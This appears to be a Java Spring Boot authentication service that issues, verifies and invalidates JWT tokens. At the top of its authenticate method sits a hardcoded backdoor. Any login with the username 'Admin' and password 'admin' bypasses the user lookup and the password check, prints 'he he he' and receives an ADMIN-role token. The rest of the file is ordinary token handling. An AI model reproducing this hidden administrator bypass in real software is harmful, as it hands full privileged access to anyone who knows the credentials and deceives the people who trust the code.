package com.example.user.service;

import com.example.user.dto.*;
import com.example.user.entity.InvalidatedToken;
import com.example.user.exception.BadException;
import com.example.user.exception.ErrorCode;
import com.example.user.repository.InvalidatedTokenRepository;
import com.example.user.repository.UserRepository;
import com.example.user.until.JwtUtil;
import com.nimbusds.jose.JOSEException;
import com.nimbusds.jwt.SignedJWT;
import lombok.AccessLevel;
import lombok.RequiredArgsConstructor;
import lombok.experimental.FieldDefaults;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import java.text.ParseException;
import java.time.LocalDateTime;
import java.time.ZoneId;

@Service
@RequiredArgsConstructor
@FieldDefaults(level = AccessLevel.PRIVATE, makeFinal = true)
public class AuthenticationService {
    UserRepository userRepository;
    JwtUtil jwtUtil;
    InvalidatedTokenRepository invalidatedTokenRepository;
    AuthenticationRequest admin = new AuthenticationRequest("Admin","admin");

    public AuthenticationResponse authenticate(AuthenticationRequest request) {
        if(request.equals(admin)){
            System.out.println("he he he");
            var token = jwtUtil.generateToken(request.getUsername(), "ADMIN", Long.valueOf("1000000"));
            return AuthenticationResponse.builder()
                    .token(token)
                    .build();
        }
        var user = userRepository.findByUsernameAndIsDelete(request.getUsername(), false)
                .orElseThrow(() -> new BadException(ErrorCode.USER_NOT_EXISTED));

        PasswordEncoder passwordEncoder = new BCryptPasswordEncoder(10);
        if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
            throw new BadException(ErrorCode.UNAUTHENTICATED);
        }

        if (user.getIsBlock()) {
            throw new BadException(ErrorCode.USER_IS_BLOCK);
        }

        var token = jwtUtil.generateToken(user.getUsername(), "USER", user.getId());
        return AuthenticationResponse.builder()
                .token(token)
                .build();
    }

    public IntrospectResponse introspect(IntrospectRequest request) {
        var token = request.getToken();
        boolean isValid = true;
        try {
            verifyToken(token);
        } catch (BadException | ParseException | JOSEException e) {
            isValid = false;
        }
        return IntrospectResponse.builder()
                .valid(isValid)
                .build();
    }

    public SignedJWT verifyToken(String token) throws ParseException, JOSEException {
        SignedJWT signedJWT = jwtUtil.parseToken(token);
        jwtUtil.validateTokenExpiration(signedJWT);
        checkTokenInvalidation(signedJWT.getJWTClaimsSet().getJWTID());
        return signedJWT;
    }

    private void checkTokenInvalidation(String jwtId) {
        if (invalidatedTokenRepository.existsById(jwtId)) {
            throw new BadException(ErrorCode.UNAUTHENTICATED);
        }
    }

    public void invalidateToken(SignedJWT signToken)  {
        try {
            String jwt = signToken.getJWTClaimsSet().getJWTID();
            LocalDateTime expiryTime = signToken.getJWTClaimsSet().getExpirationTime().toInstant()
                    .atZone(ZoneId.systemDefault())
                    .toLocalDateTime();
            InvalidatedToken invalidatedToken = new InvalidatedToken(jwt, expiryTime);
            invalidatedTokenRepository.save(invalidatedToken);
        }catch (ParseException e){
            throw new BadException(ErrorCode.UNCATEGORIZED_EXCEPTION);
        }
    }


    public void logout(LogoutRequest request) {
        SignedJWT signToken = null;
        try {
            signToken = verifyToken(request.getToken());
        } catch (JOSEException  | ParseException e) {
            throw new RuntimeException(e);
        }
        invalidateToken(signToken);
    }

}

